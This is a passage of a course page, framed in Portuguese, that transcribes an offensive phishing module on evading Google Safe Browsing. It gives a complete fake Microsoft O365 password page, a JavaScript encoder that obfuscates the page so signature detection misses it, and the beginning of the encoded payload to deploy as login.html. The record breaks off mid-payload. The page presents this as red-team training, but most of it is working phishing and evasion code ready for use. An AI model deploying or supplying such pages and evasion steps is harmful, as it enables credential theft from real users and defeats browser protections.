---
layout: cyber
section: phishing
title: "Técnicas Avançadas de Phishing"
---

# 07. Técnicas Avançadas de Phishing

## Safe Browsing, Evilginx AITM e Terraform: Phishing de Nível Avançado

Esta seção cobre técnicas avançadas: evasão do Google Safe Browsing, coleta manual de MFA/TOTP, o framework Evilginx para AITM (Adversary-In-The-Middle), HTML Smuggling para entrega de payloads, e automação de infraestrutura com Terraform.

Os módulos a seguir foram transcritos do curso MalDev Academy - Offensive Phishing Operations (Módulos 76-81).

---

# Módulo 76 — Evasão do Google Safe Browsing

Módulo 76 — Evading Google Safe Browsing

- # Módulo 76 — Evasão do Google Safe Browsing

# Disclaimer

## Introduction
Google Safe Browsing is a service provided by Google that checks URLs against a constantly updated list of suspected malicious websites. If a positive match is found when the website is scanned, Google Safe Browsing displays a warning message before the user can proceed, significantly hindering the odds of success for a phishing campaign. Many offensive security members at some point in their careers have had their website flagged by Google Safe Browsing, making it a nuisance when developing phishing campaigns.This module will explain how Google Safe Browsing works and showcase ways to evade its detection mechanism.
## How Google Safe Browsing Works
As previously mentioned, Google Safe Browsing is essentially a continuously updated database of malicious websites that can be queried by client applications to determine whether a given URL is malicious. Google Safe Browsing provides APIs to facilitate easy integration into applications: the Lookup API and the Update API.
Lookup API - This API allows client applications to send individual URLs to Google Safe Browsing for verification. It returns a response indicating whether the URL is considered safe or malicious. This API is simple to use and suitable for applications that do not need to store or maintain a local database of malicious URLs.

- Update API - This API enables applications to maintain a local, partial database of malicious URLs that can be regularly updated with minimal bandwidth usage. It is ideal for scenarios where high-performance and low-latency lookups are required, such as in web browsers or security software.

### Google Chrome
Google Chrome is one of the most widely used browsers that integrates the Safe Browsing APIs. By default, Chrome has "Standard Protection" enabled, which checks visited websites against a regularly updated database of known malicious sites. However, it also offers "Enhanced Protection," which provides real-time scanning and more advanced security checks by sending browsing data to Google for analysis. This mode increases security but comes at the expense of privacy.

If a target user is using Google Chrome, their browser will automatically check phishing websites against Google's Safe Browsing database. If Enhanced Protection is enabled, Chrome may perform additional real-time analysis, increasing the likelihood of detection.

## Website Status
Google offers a convenient tool to check whether a website has been flagged by Safe Browsing. The Safe Browsing Site Status allows users to search for a website's status and determine if it has been identified as malicious or unsafe.

### Removing Website From Safe Browsing List
Once a website is flagged, unflagging it involves removing the offending content and replacing it with new, benign content. The next step is to verify ownership of the website through Google Search Console. Under the "Security Issues" section, you can select "Request Review" to initiate a re-scan of the site. It is important to note that simply shutting down the web server will not suffice; benign content must be present on the site for it to pass the review.

The re-scanning process may take a few days and if successful, all security issues should be cleared.

## Evading Safe Browsing
Although the internal workings of Safe Browsing are not fully known, there are indications that it performs string analysis for signature detection based on various factors, such as a website's content, URL, domain name, or other characteristics. To test this, we will create two websites, one with a poor setup that is detected and the other with an improved setup that evades Safe Browsing.

### Poor Setup (1) - Detected
We set up a domain with the directory path `/common/oauth2/v2.0/authorize`, mimicking the real Microsoft URL path (e.g., `https://login.microsoftonline.com/common/oauth2/v2.0/authorize...`). Additionally, we placed a `login.html` file within the directories. Inside the `login.html` file, we included the O365 phishing template shown below. This configuration contains enough suspicious elements to trigger detection by Safe Browsing through both URL analysis and HTML content analysis.

```
<!DOCTYPE html>
<meta charset="UTF-8">
<html>
<body>
    <div id="overlay" class="overlay"></div>
    <div class="footer"><div class="footertext">Terms of use<span style="margin-left: 20px;"></span>Privacy & Cookies</div></div>
    <div class="outer">
        <div class="middle">
            <div class="sign-in-box">
                <div class="win-scroll">
                    <div class="logo">
                        <img id="logo_image" class="logo_image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" width="200px">
                    </div>
                    <div id="display_name" class="display_name">
                        username@domain.com
                    </div>
                    <div class="prompt">
                        Enter password
                    </div>
                    <div id="error">
                        Please enter the password for your Microsoft account.
                    </div>
                    <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Password" >
                </div>
                <p><span style="font-size: .8125rem;">Having trouble?</span> <a href="https://account.live.com/ResetPassword.aspx">Sign in another way</a></p>
                <p><a href="https://account.live.com/ResetPassword.aspx">More information</a></p>
                <div class="buttoncontainer">
                <input type="submit" id="submit" class="button" value="Verify" >
                </div>
            </div>
        </div>
    </div>
</body>
<head>
<title>Sign in to your account</title>
<style>
body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBtbSIgaGVpZ2h0PSIxMG1tIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAxMCAxMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogPGRlZnM+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJyYWRpYWxHcmFkaWVudDEwNTkiIGN4PSI3LjU5NDYiIGN5PSIyLjE2NSIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjExNTM2IC4yNDk0NCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZTJmZiIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWUyZmYiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTA5OSIgY3g9IjIuNTkwOCIgY3k9IjYuNTYzNCIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjQ1NTMxIDEuNDAzOCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZjFkNSIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWYxZDUiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTAyNy0xIiBjeD0iMi44Mjc5IiBjeT0iMi43MzAxIiByPSIzLjQ5OTEiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMS4yMTAxIDAgMCAxLjE4MDQgNC4zODgyIDQuNDg1KSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZiZWJlIiBvZmZzZXQ9IjAiLz4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2ZmYmViZSIgc3RvcC1vcGFjaXR5PSIwIiBvZmZzZXQ9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyYWRpYWxHcmFkaWVudCBpZD0icmFkaWFsR3JhZGllbnQxMTMxIiBjeD0iMi4wOTc2IiBjeT0iMi4wMDc5IiByPSI0LjIzNDIiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgLjk3NTQzIC44MzI2NiAuNzkwOTQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNmZmYyY2MiIG9mZnNldD0iMCIvPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZmMmNjIiBzdG9wLW9wYWNpdHk9IjAiIG9mZnNldD0iMSIvPgogIDwvcmFkaWFsR3JhZGllbnQ+CiA8L2RlZnM+CiA8bWV0YWRhdGE+CiAgPHJkZjpSREY+CiAgIDxjYzpXb3JrIHJkZjphYm91dD0iIj4KICAgIDxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PgogICAgPGRjOnR5cGUgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIvPgogICAgPGRjOnRpdGxlLz4KICAgPC9jYzpXb3JrPgogIDwvcmRmOlJERj4KIDwvbWV0YWRhdGE+CiA8Zz4KICA8ZWxsaXBzZSB0cmFuc2Zvcm09InJvdGF0ZSguMTM5MDkpIiBjeD0iMi45MzAzIiBjeT0iMi43NDk1IiByeD0iNC4yMzQyIiByeT0iNC4xMzAyIiBmaWxsPSJ1cmwoI3JhZGlhbEdyYWRpZW50MTEzMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpvdmVybGF5Ii8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuNDc5MiIgY3k9IjIuMzYxMiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwNTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6b3ZlcmxheSIvPgogIDxlbGxpcHNlIHRyYW5zZm9ybT0icm90YXRlKC4xMzkwOSkiIGN4PSIyLjEzNTUiIGN5PSI3LjgwNiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwOTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6bm9ybWFsIi8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuODEwMiIgY3k9IjcuNzA3NSIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwMjctMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpub3JtYWwiLz4KIDwvZz4KPC9zdmc+Cg==)  no-repeat fixed center; 
    background-size: cover;
    margin: 0;
}
a {
    color: #0067b8;
    text-decoration: none;
    font-size: .8125rem;
}
.overlay {
    background-color: #101010;
    opacity: .1;
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 100vw;
    z-index: 0;
}
.footer {
    background-color: rgba(20,20,20, 0.6);
    position: fixed;
    bottom: 0;
    height: 28px;
    width: 100vw;
    z-index: 0;
}
.footertext {
    position: fixed;
    right: 0;
    text-align: right;
    color: #fff;
    font-size: 12px;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    margin-left: 8px;
    margin-right: 50px;
}
.outer {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
    z-index: 10;
}
.middle {
    display: table-cell;
    vertical-align: middle;
}
.sign-in-box {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 400px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    box-shadow: 0 2px 6px rgba(0,0,0,.2);
    min-width: 300px;
    min-height: 300px;
    overflow: hidden;
}

.win-scroll {
    box-sizing: border-box;
}
.logo {
    margin-bottom: 10px;
    box-sizing: border-box;
}
.logo_image {
    height: 40px;
}
.display_name {
    line-height: 24px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    margin-bottom: 15px;
}
.prompt {
    color: #1b1b1b;
    font-size: 1.5rem;
    font-weight: 600;
    padding: 0;
    margin-top: 16px;
    margin-bottom: 15px;
}
#error {
    color: red;
    display: none;
}
.passwordinput {
    padding: 4px 8px;
    border-style: solid;
    border-width: 2px;
    border-color: rgba(0,0,0,.4);
    background-color: rgba(255,255,255,.4);
    height: 32px;
    height: 2rem;
    padding: 6px 10px;
    padding-left: 10px;
    border-width: 1px;
    border-top-width: 1px;
    border-right-width: 1px;
    border-left-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding-left: 0;
    display: block;
    width: 90%;
    margin-bottom: 15px;
}
.buttoncontainer {
    position: absolute;
    bottom: 72px;
    right: 50px;
    text-align: right;
    width: 100%;
}
.button {
    color: #fff;
    border-color: #0067b8;
    background-color: #0067b8;
    display: block;
    width: 120px;
    position: absolute;
    right: 0px;
    padding: 5px 14px 6px 14px;
}
.button:hover {
    border-color: #0055a6;
    background-color: #0055a6;
}
</style>
</head>
</html>

```
With enhanced protection enabled on Google Chrome, we browse to the domain and immediately it's flagged by Safe Browsing.

The video can be found in folder: `./videos/demo-1-safe-browsing.mp4`

### Poor Setup (2) - Detected
Interestingly, in another setup using a different domain, we replicated the same directory path as the previous setup (`/common/oauth2/v2.0/authorize`), and the domain was flagged almost immediately, even without any content hosted on it. This demonstrates that the URL alone is enough to identify a domain as malicious, indicating that Safe Browsing relies on signature detection for URLs.

The video can be found in folder: `./videos/demo-2-safe-browsing.mp4`

### Improved Setup - Undetected
In this setup, we take additional measures to prevent our domain from being flagged by Safe Browsing. For this example, we configure a new domain with a directory named `temp` and place a `login.html` file within it. Notice that the URL does not have any suspicious indicators, unlike previous setups where we copied Microsoft's URL directory naming conventions.

Additionally, instead of directly pasting unobfuscated phishing content into `login.html`, we first obfuscate it using JavaScript. The `encodePhishingContent` function encodes each character of the phishing content into its percent-encoded hexadecimal representation (e.g., `A` becomes `%41`) and pads it to ensure two-digit formatting for consistency.

```
function encodePhishingContent(value) {
    let encoded = '';
    for (let i = 0; i < value.length; i++) {
        let charCode = value.charCodeAt(i);
        let hexCode = charCode.toString(16);
        let paddedHex = hexCode.padStart(2, '0');
        encoded += `%${paddedHex}`;
    }

    return encoded;
}

const originalPhishingContent = `
<!DOCTYPE html>
<meta charset="UTF-8">
<html>
<body>
    <div id="overlay" class="overlay"></div>
    <div class="footer"><div class="footertext">Terms of use<span style="margin-left: 20px;"></span>Privacy & Cookies</div></div>
    <div class="outer">
        <div class="middle">
            <div class="sign-in-box">
                <div class="win-scroll">
                    <div class="logo">
                        <img id="logo_image" class="logo_image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" width="200px">
                    </div>
                    <div id="display_name" class="display_name">
                        username@domain.com
                    </div>
                    <div class="prompt">
                        Enter password
                    </div>
                    <div id="error">
                        Please enter the password for your Microsoft account.
                    </div>
                    <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Password" >
                </div>
                <p><span style="font-size: .8125rem;">Having trouble?</span> <a href="https://account.live.com/ResetPassword.aspx">Sign in another way</a></p>
                <p><a href="https://account.live.com/ResetPassword.aspx">More information</a></p>
                <div class="buttoncontainer">
                <input type="submit" id="submit" class="button" value="Verify" >
                </div>
            </div>
        </div>
    </div>
</body>
<head>
<title>Sign in to your account</title>
<style>
body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBtbSIgaGVpZ2h0PSIxMG1tIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAxMCAxMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogPGRlZnM+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJyYWRpYWxHcmFkaWVudDEwNTkiIGN4PSI3LjU5NDYiIGN5PSIyLjE2NSIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjExNTM2IC4yNDk0NCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZTJmZiIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWUyZmYiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTA5OSIgY3g9IjIuNTkwOCIgY3k9IjYuNTYzNCIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjQ1NTMxIDEuNDAzOCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZjFkNSIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWYxZDUiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTAyNy0xIiBjeD0iMi44Mjc5IiBjeT0iMi43MzAxIiByPSIzLjQ5OTEiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMS4yMTAxIDAgMCAxLjE4MDQgNC4zODgyIDQuNDg1KSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZiZWJlIiBvZmZzZXQ9IjAiLz4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2ZmYmViZSIgc3RvcC1vcGFjaXR5PSIwIiBvZmZzZXQ9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyYWRpYWxHcmFkaWVudCBpZD0icmFkaWFsR3JhZGllbnQxMTMxIiBjeD0iMi4wOTc2IiBjeT0iMi4wMDc5IiByPSI0LjIzNDIiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgLjk3NTQzIC44MzI2NiAuNzkwOTQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNmZmYyY2MiIG9mZnNldD0iMCIvPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZmMmNjIiBzdG9wLW9wYWNpdHk9IjAiIG9mZnNldD0iMSIvPgogIDwvcmFkaWFsR3JhZGllbnQ+CiA8L2RlZnM+CiA8bWV0YWRhdGE+CiAgPHJkZjpSREY+CiAgIDxjYzpXb3JrIHJkZjphYm91dD0iIj4KICAgIDxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PgogICAgPGRjOnR5cGUgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIvPgogICAgPGRjOnRpdGxlLz4KICAgPC9jYzpXb3JrPgogIDwvcmRmOlJERj4KIDwvbWV0YWRhdGE+CiA8Zz4KICA8ZWxsaXBzZSB0cmFuc2Zvcm09InJvdGF0ZSguMTM5MDkpIiBjeD0iMi45MzAzIiBjeT0iMi43NDk1IiByeD0iNC4yMzQyIiByeT0iNC4xMzAyIiBmaWxsPSJ1cmwoI3JhZGlhbEdyYWRpZW50MTEzMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpvdmVybGF5Ii8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuNDc5MiIgY3k9IjIuMzYxMiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwNTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6b3ZlcmxheSIvPgogIDxlbGxpcHNlIHRyYW5zZm9ybT0icm90YXRlKC4xMzkwOSkiIGN4PSIyLjEzNTUiIGN5PSI3LjgwNiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwOTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6bm9ybWFsIi8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuODEwMiIgY3k9IjcuNzA3NSIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwMjctMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpub3JtYWwiLz4KIDwvZz4KPC9zdmc+Cg==)  no-repeat fixed center; 
    background-size: cover;
    margin: 0;
}
a {
    color: #0067b8;
    text-decoration: none;
    font-size: .8125rem;
}
.overlay {
    background-color: #101010;
    opacity: .1;
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 100vw;
    z-index: 0;
}
.footer {
    background-color: rgba(20,20,20, 0.6);
    position: fixed;
    bottom: 0;
    height: 28px;
    width: 100vw;
    z-index: 0;
}
.footertext {
    position: fixed;
    right: 0;
    text-align: right;
    color: #fff;
    font-size: 12px;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    margin-left: 8px;
    margin-right: 50px;
}
.outer {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
    z-index: 10;
}
.middle {
    display: table-cell;
    vertical-align: middle;
}
.sign-in-box {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 400px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    box-shadow: 0 2px 6px rgba(0,0,0,.2);
    min-width: 300px;
    min-height: 300px;
    overflow: hidden;
}

.win-scroll {
    box-sizing: border-box;
}
.logo {
    margin-bottom: 10px;
    box-sizing: border-box;
}
.logo_image {
    height: 40px;
}
.display_name {
    line-height: 24px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    margin-bottom: 15px;
}
.prompt {
    color: #1b1b1b;
    font-size: 1.5rem;
    font-weight: 600;
    padding: 0;
    margin-top: 16px;
    margin-bottom: 15px;
}
#error {
    color: red;
    display: none;
}
.passwordinput {
    padding: 4px 8px;
    border-style: solid;
    border-width: 2px;
    border-color: rgba(0,0,0,.4);
    background-color: rgba(255,255,255,.4);
    height: 32px;
    height: 2rem;
    padding: 6px 10px;
    padding-left: 10px;
    border-width: 1px;
    border-top-width: 1px;
    border-right-width: 1px;
    border-left-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding-left: 0;
    display: block;
    width: 90%;
    margin-bottom: 15px;
}
.buttoncontainer {
    position: absolute;
    bottom: 72px;
    right: 50px;
    text-align: right;
    width: 100%;
}
.button {
    color: #fff;
    border-color: #0067b8;
    background-color: #0067b8;
    display: block;
    width: 120px;
    position: absolute;
    right: 0px;
    padding: 5px 14px 6px 14px;
}
.button:hover {
    border-color: #0055a6;
    background-color: #0055a6;
}
</style>
</head>
</html>
`;

const encodedPhishingContent = encodePhishingContent(originalPhishingContent);

// Print the encoded content onto the console
console.log(encodedPhishingContent);

```
Retrieve the encoded phishing content by executing it in the browser console or in any other JavaScript playground environment.

Next, paste the following contents into `login.html`:

```
const val = `%0a%3c%21%44%4f%43%54%59%50%45%20%68%74%6d%6c%3e%0a%3c%6d%65%74%61%20%63%68%61%72%73%65%74%3d%22%55%54%46%2d%38%22%3e%0a%3c%68%74%6d%6c%3e%0a%3c%62%6f%64%79%3e%0a%20%20%20%20%3c%64%69%76%20%69%64%3d%22%6f%76%65%72%6c%61%79%22%20%63%6c%61%73%73%3d%22%6f%76%65%72%6c%61%79%22%3e%3c%2f%64%69%76%3e%0a%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%66%6f%6f%74%65%72%22%3e%3c%64%69%76%20%63%6c%61%73%73%3d%22%66%6f%6f%74%65%72%74%65%78%74%22%3e%54%65%72%6d%73%20%6f%66%20%75%73%65%3c%73%70%61%6e%20%73%74%79%6c%65%3d%22%6d%61%72%67%69%6e%2d%6c%65%66%74%3a%20%32%30%70%78%3b%22%3e%3c%2f%73%70%61%6e%3e%50%72%69%76%61%63%79%20%26%20%43%6f%6f%6b%69%65%73%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%0a%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%6f%75%74%65%72%22%3e%0a%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%6d%69%64%64%6c%65%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%73%69%67%6e%2d%69%6e%2d%62%6f%78%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%77%69%6e%2d%73%63%72%6f%6c%6c%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%6c%6f%67%6f%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%69%6d%67%20%69%64%3d%22%6c%6f%67%6f%5f%69%6d%61%67%65%22%20%63%6c%61%73%73%3d%22%6c%6f%67%6f%5f%69%6d%61%67%65%22%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%75%70%6c%6f%61%64%2e%77%69%6b%69%6d%65%64%69%61%2e%6f%72%67%2f%77%69%6b%69%70%65%64%69%61%2f%63%6f%6d%6d%6f%6e%73%2f%74%68%75%6d%62%2f%39%2f%39%36%2f%4d%69%63%72%6f%73%6f%66%74%5f%6c%6f%67%6f%5f%25%32%38%32%30%31%32%25%32%39%2e%73%76%67%2f%31%32%38%30%70%78%2d%4d%69%63%72%6f%73%6f%66%74%5f%6c%6f%67%6f%5f%25%32%38%32%30%31%32%25%32%39%2e%73%76%67%2e%70%6e%67%22%20%77%69%64%74%68%3d%22%32%30%30%70%78%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%69%64%3d%22%64%69%73%70%6c%61%79%5f%6e%61%6d%65%22%20%63%6c%61%73%73%3d%22%64%69%73%70%6c%61%79%5f%6e%61%6d%65%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%75%73%65%72%6e%61%6d%65%40%64%6f%6d%61%69%6e%2e%63%6f%6d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%70%72%6f%6d%70%74%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%45%6e%74%65%72%20%70%61%73%73%77%6f%72%64%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%64